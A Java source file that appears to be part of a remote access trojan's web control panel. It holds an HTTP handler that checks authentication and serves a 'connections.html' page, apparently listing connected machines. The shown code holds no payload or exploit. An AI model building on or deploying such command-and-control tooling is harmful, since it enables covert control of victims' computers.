package electron.web.pages;

import java.io.IOException;
import java.io.OutputStream;
import com.sun.net.httpserver.HttpHandler;

import electron.RAT_server;
import electron.utils.logger;
import electron.web.Loader;
import electron.web.WebUtils;

@SuppressWarnings("restriction")
public class MainPageHandler implements HttpHandler {
	@Override
	public void handle(com.sun.net.httpserver.HttpExchange exchange) throws IOException {
		if (!Loader.checkAuth(exchange)) {
			return;
		}
		String response = WebUtils.getResource("connections.html");
		WebUtils.sendResponse(exchange, response, 200);
	}
}
